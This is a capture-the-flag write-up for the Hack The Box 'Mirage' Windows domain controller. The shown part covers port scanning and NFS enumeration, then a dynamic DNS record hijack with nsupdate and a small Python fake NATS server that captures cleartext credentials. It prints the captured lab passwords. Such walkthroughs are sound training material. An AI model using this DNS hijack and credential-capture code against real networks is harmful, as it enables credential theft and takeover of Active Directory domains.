---
title: 🌵 HTB Mirage Write-up
name: Mirage
date: 2025-11-22
last_modified_at: 2025-11-22
difficulty: Hard
os: Windows
skills: Enumeration, ACE Abuse, Kerberos, Password Cracking, GMSA Password Read, Reverse Shell, ESC10, RBCD, Privilege Escalation
tools: rustscan, nmap, nxc, BloodHound, hashcat, bloodyAD, impacket-getTGT, impacket-getST, impacket-secretsdump, impacket-GetUserSPNs, klist, evil-winrm, RunasCs, nc, certipy-ad, ntpdate, nsupdate
published: true
---

![](images/Pasted%20image%2020250724222327.png)

## 📝 Summary

I immediately noticed that an NFS server was running on the Mirage Windows Server — unusual on its own — and further inspection revealed two files being shared. The first mentioned that the company was in the process of phasing out NTLM authentication in favor of Kerberos. The second report noted that the dynamic DNS record for `nats-svc.mirage.htb` had been scavenged, which broke NATS CLI access. A recommendation had been made to convert the record to a static one, but it was never actioned.

Since the recommendation was ignored, I was able to register the DNS record myself and point it to my attack host. By hosting a fake NATS server, I captured the NATS credentials for `Dev_Account_A`. Using these credentials against the real NATS instance on the target, I discovered a stored NATS JetStream message containing domain credentials for David Jjackson.

With David’s credentials, I enumerated AD and identified that Nathan Aadam’s account was vulnerable to Kerberoasting. After roasting and cracking the hash, I used `evil-winrm` to gain remote access. Running WinPEAS revealed AutoLogon credentials for Mark Bbond.

Mark’s privileges allowed enabling Javier Mmarshall’s disabled account, resetting his LogonHours restriction, and updating his password. Javier, in turn, had rights to retrieve the GMSA password for the `mirage-service$` account.

Using the `mirage-service$` account with Certipy, I exploited ADCS ESC10 on the server. From there, I leveraged RBCD to delegate rights from `DC01$` to `mirage-service$`. With these permissions, the service account performed a DCSync, allowing me to dump all AD credentials — including the domain Administrator — and ultimately compromise the entire domain.

## ✉️ NATS

### 🔎 Recon

**Initial scan** revealed open ports:
- `53/tcp`, `88/tcp`, `135/tcp`, `139/tcp`, `389/tcp`, `445/tcp`, `464/tcp`, `593/tcp`, `636/tcp`, `3268/tcp`, `3269/tcp`, `9389/tcp` : Microsoft Active Directory Server.
- `5985/tcp`: Microsoft Windows Remote Management.
- `111/tcp`, `2049/tcp`: NFS.
- `4222/tcp`: NATS messaging Server.

```
fcoomans@kali:~/htb/mirage$ rustscan -a 10.10.11.78 --tries 5 --ulimit 10000 -- -sCV -oA mirage_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.78:53
Open 10.10.11.78:88
Open 10.10.11.78:111
Open 10.10.11.78:135
Open 10.10.11.78:139
Open 10.10.11.78:389
Open 10.10.11.78:445
Open 10.10.11.78:464
Open 10.10.11.78:593
Open 10.10.11.78:636
Open 10.10.11.78:2049
Open 10.10.11.78:3268
Open 10.10.11.78:3269
Open 10.10.11.78:5985
Open 10.10.11.78:4222
Open 10.10.11.78:9389
Open 10.10.11.78:47001
Open 10.10.11.78:49664
Open 10.10.11.78:49665
Open 10.10.11.78:49666
Open 10.10.11.78:49667
Open 10.10.11.78:49668
Open 10.10.11.78:54146
Open 10.10.11.78:54155
Open 10.10.11.78:54156
Open 10.10.11.78:54171
Open 10.10.11.78:54177
Open 10.10.11.78:54192
Open 10.10.11.78:54208
Open 10.10.11.78:60750
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA mirage_tcp_all" on ip 10.10.11.78

<SNIP>

Nmap scan report for 10.10.11.78
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2025-07-24 13:22:13 SAST for 208s

PORT      STATE SERVICE         REASON          VERSION
53/tcp    open  domain          syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-23 11:25:12Z)
111/tcp   open  rpcbind         syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
| -----BEGIN CERTIFICATE-----
| MIIF7DCCBNSgAwIBAgITSQAAAAmly5tE1w7/PwABAAAACTANBgkqhkiG9w0BAQsF
<SNIP>
| rpwi2htMcsDvYoIjkMtm2AjeGJkI1q5Cb2L0f+wl/FU=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?   syn-ack ttl 127
464/tcp   open  kpasswd5?       syn-ack ttl 127
593/tcp   open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
| -----BEGIN CERTIFICATE-----
| MIIF7DCCBNSgAwIBAgITSQAAAAmly5tE1w7/PwABAAAACTANBgkqhkiG9w0BAQsF
<SNIP>
| rpwi2htMcsDvYoIjkMtm2AjeGJkI1q5Cb2L0f+wl/FU=
|_-----END CERTIFICATE-----
2049/tcp  open  nlockmgr        syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
| -----BEGIN CERTIFICATE-----
| MIIF7DCCBNSgAwIBAgITSQAAAAmly5tE1w7/PwABAAAACTANBgkqhkiG9w0BAQsF
<SNIP>
| rpwi2htMcsDvYoIjkMtm2AjeGJkI1q5Cb2L0f+wl/FU=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        syn-ack ttl 127
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
| -----BEGIN CERTIFICATE-----
| MIIF7DCCBNSgAwIBAgITSQAAAAmly5tE1w7/PwABAAAACTANBgkqhkiG9w0BAQsF
<SNIP>
| rpwi2htMcsDvYoIjkMtm2AjeGJkI1q5Cb2L0f+wl/FU=
|_-----END CERTIFICATE-----
4222/tcp  open  vrml-multi-use? syn-ack ttl 127
| fingerprint-strings:
|   GenericLines:
|     INFO {"server_id":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","server_name":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":36,"client_ip":"10.10.14.113","xkey":"XAZTFJS5AJIRZSYHQUA3DJYP3FZN234BR5METKLJAXGYIAMJ4WRDBMXP"}
|     -ERR 'Authorization Violation'
|   GetRequest:
|     INFO {"server_id":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","server_name":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":37,"client_ip":"10.10.14.113","xkey":"XAZTFJS5AJIRZSYHQUA3DJYP3FZN234BR5METKLJAXGYIAMJ4WRDBMXP"}
|     -ERR 'Authorization Violation'
|   HTTPOptions:
|     INFO {"server_id":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","server_name":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":38,"client_ip":"10.10.14.113","xkey":"XAZTFJS5AJIRZSYHQUA3DJYP3FZN234BR5METKLJAXGYIAMJ4WRDBMXP"}
|     -ERR 'Authorization Violation'
|   NULL:
|     INFO {"server_id":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","server_name":"NC4IKOA37O6UAUR24KUKIIU36PMIDUPPJW6KBMYJ52MUYNRXAYHV62OM","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":35,"client_ip":"10.10.14.113","xkey":"XAZTFJS5AJIRZSYHQUA3DJYP3FZN234BR5METKLJAXGYIAMJ4WRDBMXP"}
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf          syn-ack ttl 127 .NET Message Framing
47001/tcp open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  unknown         syn-ack ttl 127
49665/tcp open  unknown         syn-ack ttl 127
49666/tcp open  unknown         syn-ack ttl 127
49667/tcp open  unknown         syn-ack ttl 127
49668/tcp open  unknown         syn-ack ttl 127
54146/tcp open  unknown         syn-ack ttl 127
54155/tcp open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
54156/tcp open  unknown         syn-ack ttl 127
54171/tcp open  unknown         syn-ack ttl 127
54177/tcp open  unknown         syn-ack ttl 127
54192/tcp open  unknown         syn-ack ttl 127
54208/tcp open  unknown         syn-ack ttl 127
60750/tcp open  unknown         syn-ack ttl 127
<SNIP>
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `dc01.mirage.htb` and `mirage.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/mirage$ grep mirage.htb /etc/hosts
10.10.11.78     dc01.mirage.htb mirage.htb
```

I ran a UDP port scan and found these open ports:
- `53/udp`, `88/udp`: Microsoft Active Directory Server DNS and Kerberos.
- `123/udp`: Microsoft Simple Network Time Protocol.
- `111/udp`, `2049/udp`: NFS.

```
fcoomans@kali:~/htb/mirage$ nmap --top-ports 100 --open -sU dc01.mirage.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 13:27 SAST
Nmap scan report for dc01.mirage.htb (10.10.11.78)
Host is up (0.25s latency).
Not shown: 81 closed udp ports (port-unreach)
PORT      STATE         SERVICE
53/udp    open          domain
88/udp    open          kerberos-sec
111/udp   open          rpcbind
123/udp   open          ntp
136/udp   open|filtered profile
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
500/udp   open|filtered isakmp
1022/udp  open|filtered exp2
1433/udp  open|filtered ms-sql-s
2049/udp  open          nfs
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
10000/udp open|filtered ndmp
17185/udp open|filtered wdbrpc
49153/udp open|filtered unknown
49182/udp open|filtered unknown
49188/udp open|filtered unknown
49193/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 102.36 seconds
```

I updated `/etc/krb5.conf` with the `mirage.htb` domain information for Kerberos functions.

```
fcoomans@kali:~/htb/mirage$ cat /etc/krb5.conf
[libdefaults]
        default_realm = MIRAGE.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false

        allow_weak_crypto = true


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        MIRAGE.HTB = {
                kdc = DC01.mirage.htb
                admin_server = DC01.mirage.htb
                default_domain = mirage.htb
        }

[domain_realm]
        .mirage.htb = MIRAGE.HTB
        mirage.htb = MIRAGE.HTB
```

And used `ntpdate` to sync the attack host time with `dc01.mirage.htb`.

```
fcoomans@kali:~/htb/mirage$ sudo ntpdate dc01.mirage.htb
2025-07-23 13:36:08.782127 (+0200) -86162.793291 +/- 0.077195 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by -86162.793291
```

**Network File System (NFS)**

Network File System (NFS) is usually not something you see on a Windows Server.  So, I had to inspect this first.  
I used NetExec (`nxc`) to show the NFS shares running on the target.

```
fcoomans@kali:~/htb/mirage$ nxc nfs dc01.mirage.htb --shares
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Enumerating NFS Shares
NFS         10.10.11.78     2049   dc01.mirage.htb  UID        Perms    Storage Usage    Share                          Access List
NFS         10.10.11.78     2049   dc01.mirage.htb  ---        -----    -------------    -----                          -----------
NFS         10.10.11.78     2049   dc01.mirage.htb  4294967294 r--      16.2GB/19.8GB    /MirageReports                 No network
```

The files inside the `/MirageReports` were listed next.  The server hosted two files on this NFS share;  one about missing DNS records for the `nats-svc` service and an authentication hardening report for the target.

```
fcoomans@kali:~/htb/mirage$ nxc nfs dc01.mirage.htb --share "/MirageReports" --ls
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.10.11.78     2049   dc01.mirage.htb  UID        Perms  File Size     File Path
NFS         10.10.11.78     2049   dc01.mirage.htb  ---        -----  ---------     ---------
NFS         10.10.11.78     2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/.
NFS         10.10.11.78     2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/..
NFS         10.10.11.78     2049   dc01.mirage.htb  4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.10.11.78     2049   dc01.mirage.htb  4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
```

Both files were downloaded.

```
fcoomans@kali:~/htb/mirage$ nxc nfs dc01.mirage.htb --share "/MirageReports" --get-file "Incident_Report_Missing_DNS_Record_nats-svc.pdf" "Incident_Report_Missing_DNS_Record_nats-svc.pdf"
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Downloading Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.10.11.78     2049   dc01.mirage.htb  File successfully downloaded from Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf

fcoomans@kali:~/htb/mirage$ nxc nfs dc01.mirage.htb --share "/MirageReports" --get-file "Mirage_Authentication_Hardening_Report.pdf" "Mirage_Authentication_Hardening_Report.pdf"
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.10.11.78     2049   dc01.mirage.htb  [*] Downloading Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf
NFS         10.10.11.78     2049   dc01.mirage.htb  File successfully downloaded from Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf
```

`Mirage_Authentication_Hardening_Report.pdf` basically said that the company was busy with phasing out NTLM authentication and switching completely to Kerberos authentication.

`Incident_Report_Missing_DNS_Record_nats-svc.pdf` showed that whilst trying to access the NATS server, the IT Team found that the `nats-svc` DNS record was scavenged.  The `nats-svc` DNS record wasn't refreshed within 14 days, was considered stale and was removed.

The recommendations were to create a static DNS A record for `nats-svc`, increase the scavenging interval to 21-30 days or disable DNS scavenging completely.

But were any of these recommendations followed?

![](images/Pasted%20image%2020251122064858.png)

The report also showed the command used to connect to the NATS server: `.\nats -s nats://nats-svc:4222 rtt --user $user --password $password`.  
This meant that they used the NATS CLI to send a username and password to the NATS server, but this didn't work due to the DNS scavenging issue.

![](images/Pasted%20image%2020251122070131.png)

This raised two things that just had to be tested:
1. Was the `nats-svc` DNS record changed to a static record, or can it still be dynamically updated?  Can this record be changed to a computer that I have control over?
2. How does the NATS server log and display messages received?  

The development team might still be actively trying to connect to the NATS server with their username and password.
If I could change this to my Kali attack host and start a NATS server on that host, then I might be able to steal the credentials...

**DNS Dynamic Updates**

The first thing that had to be checked was whether the `nats-svc` record was now changed to a static DNS A record or whether it was still dynamic.  
I used `nsupdate` to connect to the DNS server and added a new `nats-svc` DNS record, containing my attack host IP.  

```
fcoomans@kali:~/htb/mirage$ nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.14.113
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
nats-svc.mirage.htb.    3600    IN      A       10.10.14.113

> send
> quit
```

This was accepted and set as the new DNS record for `nats-svc`.  
Interesting!  This meant that the recommendations in the report weren't followed and that anybody could update the DNS record to whatever they want...

```
fcoomans@kali:~/htb/mirage$ dig nats-svc.mirage.htb @dc01.mirage.htb

; <<>> DiG 9.20.9-1-Debian <<>> nats-svc.mirage.htb @dc01.mirage.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48779
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;nats-svc.mirage.htb.           IN      A

;; ANSWER SECTION:
nats-svc.mirage.htb.    3600    IN      A       10.10.14.113

;; Query time: 154 msec
;; SERVER: 10.10.11.78#53(dc01.mirage.htb) (UDP)
;; WHEN: Fri Jul 25 03:39:38 SAST 2025
;; MSG SIZE  rcvd: 64
```

**Neural Autonomic Transport System (NATS)**

According to Wikipedia (https://en.wikipedia.org/wiki/NATS_Messaging), NATS  or Neural Autonomic Transport System is a server/client messaging system, with some storage of messages through JetStream.

In short, NATS is a middleware to handle messages between clients.  The messages could be sent immediately in real-time or "stored" with JetStream for later retrieval.  
I knew from the `nmap` scan that JetStream was available on the target.  What interesting messages were waiting to be retrieved?

The next step was to evaluate the NATS server logging/output for received messages.  
The latest NATS server release was downloaded from https://github.com/nats-io/nats-server, extracted,
 
```
fcoomans@kali:~/htb/mirage$ wget --no-check-certificate https://github.com/nats-io/nats-server/releases/download/v2.11.6/nats-server-v2.11.6-linux-amd64.tar.gz

fcoomans@kali:~/htb/mirage$ tar xvzf nats-server-v2.11.6-linux-amd64.tar.gz
nats-server-v2.11.6-linux-amd64/LICENSE
nats-server-v2.11.6-linux-amd64/README.md
nats-server-v2.11.6-linux-amd64/nats-server
```

And started.  The server would bind on the attack host address (`-a`) and requires a username (`--user`) and password (`--pass`) for authentication.  All connections and messages would be debugged, and a verbose trace (`-DVV`) displayed.

```
fcoomans@kali:~/htb/mirage$ cd nats-server-v2.11.6-linux-amd64

fcoomans@kali:~/htb/mirage/nats-server-v2.11.6-linux-amd64$ ./nats-server -a 10.10.14.113 --user test --pass test -DVV
[215195] 2025/07/25 04:25:47.314963 [INF] Starting nats-server
[215195] 2025/07/25 04:25:47.315035 [INF]   Version:  2.11.6
[215195] 2025/07/25 04:25:47.315041 [INF]   Git:      [bc813ee]
[215195] 2025/07/25 04:25:47.315044 [DBG]   Go build: go1.24.4
<SNIP>
```

The latest NATS CLI release was downloaded from https://github.com/nats-io/natscli, extracted,

```
fcoomans@kali:~/htb/mirage$ wget --no-check-certificate https://github.com/nats-io/natscli/releases/download/v0.2.4/nats-0.2.4-linux-amd64.zip

fcoomans@kali:~/htb/mirage$ unzip nats-0.2.4-linux-amd64.zip
Archive:  nats-0.2.4-linux-amd64.zip
  inflating: nats-0.2.4-linux-amd64/LICENSE
  inflating: nats-0.2.4-linux-amd64/README.md
  inflating: nats-0.2.4-linux-amd64/nats
```

And used to connect to the NATS server using the test credentials and the server would be asked to show its information.

```
fcoomans@kali:~/htb/mirage$ cd nats-0.2.4-linux-amd64

fcoomans@kali:~/htb/mirage/nats-0.2.4-linux-amd64$ ./nats server info 10.10.14.113 --server 10.10.14.113 --user test --password test
nats: error: no results received, ensure the account used has system privileges and appropriate permissions
```

Unfortunately, the server REDACTED the password in its verbose output trace.

```
[215195] 2025/07/25 04:26:34.264699 [DBG] 10.10.14.113:51080 - cid:5 - Client connection created
[215195] 2025/07/25 04:26:34.265349 [TRC] 10.10.14.113:51080 - cid:5 - <<- [CONNECT {"verbose":false,"pedantic":false,"user":"test","pass":"[REDACTED]","tls_required":false,"name":"NATS CLI Version 0.2.4","lang":"go","version":"1.43.0","protocol":1,"echo":true,"headers":true,"no_responders":true}]
```

I used `nc` to grab the NATS server banner.

```
fcoomans@kali:~/htb/mirage$ nc 10.10.14.113 4222
INFO {"server_id":"NADFGPIXGXZNSNET4LZYMDAA4PYLC4CPCKXFRRTKCKMQRPP7FRKSADGF","server_name":"NADFGPIXGXZNSNET4LZYMDAA4PYLC4CPCKXFRRTKCKMQRPP7FRKSADGF","version":"2.11.6","proto":1,"git_commit":"bc813ee","go":"go1.24.4","host":"10.10.14.113","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"client_id":6,"client_ip":"10.10.14.113","xkey":"XC4DRMTTBRU536LDBQBU733VLTSCZT6L7TJXFZ3YXFFRWXUKMU5WEWHC"}
-ERR 'Authentication Timeout'
```

And created a basic `nats_capture.py` Python script that would simulate a NATS server.  The banner would be sent to a connecting client and then the client response/message would be printed in cleartext without redacting anything.

{% raw %}
```python
import socket

ATTACKER_IP = "10.10.14.113"
BANNER = f'INFO {{"server_id":"NADFGPIXGXZNSNET4LZYMDAA4PYLC4CPCKXFRRTKCKMQRPP7FRKSADGF","server_name":"NADFGPIXGXZNSNET4LZYMDAA4PYLC4CPCKXFRRTKCKMQRPP7FRKSADGF","version":"2.11.6","proto":1,"git_commit":"bc813ee","go":"go1.24.4","host":"{ATTACKER_IP}","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"client_id":6,"client_ip":"{ATTACKER_IP}","xkey":"XC4DRMTTBRU536LDBQBU733VLTSCZT6L7TJXFZ3YXFFRWXUKMU5WEWHC"}}\n'


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ATTACKER_IP, 4222))
    server.listen()
    print(f"[*] Listening on {ATTACKER_IP}:4222")

    while True:
        client_socket, client_address = server.accept()
        print(f"[*] Connection from {client_address}")

        # Send BANNER to client
        client_socket.send(BANNER.encode())
        print("[*] Sent INFO message")

        # Receive client response
        data = client_socket.recv(4096).decode()
        print(f"[*] Received: {data}")

        client_socket.close()


if __name__ == "__main__":
    main()
```
{% endraw %}

The simulated NATS server script was started.

```
fcoomans@kali:~/htb/mirage$ python nats_capture.py
[*] Listening on 10.10.14.113:4222
```

And the NATS CLI client connected to it with the same test credentials.

```
fcoomans@kali:~/htb/mirage/nats-0.2.4-linux-amd64$ ./nats server info 10.10.14.113 --server 10.10.14.113 --user test --password test
nats: error: EOF
```

The credentials were displayed in clear text.

```
fcoomans@kali:~/htb/mirage$ python nats_capture.py
[*] Listening on 10.10.14.113:4222
[*] Connection from ('10.10.14.113', 48024)
[*] Sent INFO message
[*] Received: CONNECT {"verbose":false,"pedantic":false,"user":"test","pass":"test","tls_required":false,"name":"NATS CLI Version 0.2.4","lang":"go","version":"1.43.0","protocol":1,"echo":true,"headers":true,"no_responders":true}
PING
```

### 🧪 Exploitation

`nsupdate` was used to update the `nats-svc.mirage.htb` record on the server to point to the attack host.

```
fcoomans@kali:~/htb/mirage$ nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.14.113
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
nats-svc.mirage.htb.    3600    IN      A       10.10.14.113

> send
> quit
```

`dig` confirmed that the change was in effect.  This meant that all clients that attempt to connect to the NATS server would now connect to my simulated NATS server on the attack host.

```
fcoomans@kali:~/htb/mirage$ dig nats-svc.mirage.htb @dc01.mirage.htb

; <<>> DiG 9.20.9-1-Debian <<>> nats-svc.mirage.htb @dc01.mirage.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 43838
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;nats-svc.mirage.htb.           IN      A

;; ANSWER SECTION:
nats-svc.mirage.htb.    3600    IN      A       10.10.14.113

;; Query time: 154 msec
;; SERVER: 10.10.11.78#53(dc01.mirage.htb) (UDP)
;; WHEN: Fri Jul 25 04:41:57 SAST 2025
;; MSG SIZE  rcvd: 64
```

I then started the `nats_capture.py` simulated NATS server and almost immediately received a connection from `Dev_Account_A` who authenticated using password `hx5h7F5554fP@1337!`.

```
fcoomans@kali:~/htb/mirage$ python nats_capture.py
[*] Listening on 10.10.14.113:4222
[*] Connection from ('10.10.11.78', 56838)
[*] Sent INFO message
[*] Received: CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}
PING
```

I used the NATS CLI to connect to the NATS server running on the target with the `Dev_Account_A` credentials and asked it to list (`ls`) all stored messages in JetStream (`stream`).  One message was waiting to be viewed.

```
fcoomans@kali:~/htb/mirage/nats-0.2.4-linux-amd64$ ./nats stream ls --server 10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
╭─────────────────────────────────────────────────────────────────────────────────╮
│                                     Streams                                     │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ auth_logs │             │ 2025-05-05 09:18:19 │ 5        │ 570 B │ 79d20h28m12s │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯
```

The NATS CLI was then used to view the message.  This revealed the username `david.jjackson` and password `pN8kQmn6b86!1234@`.

```
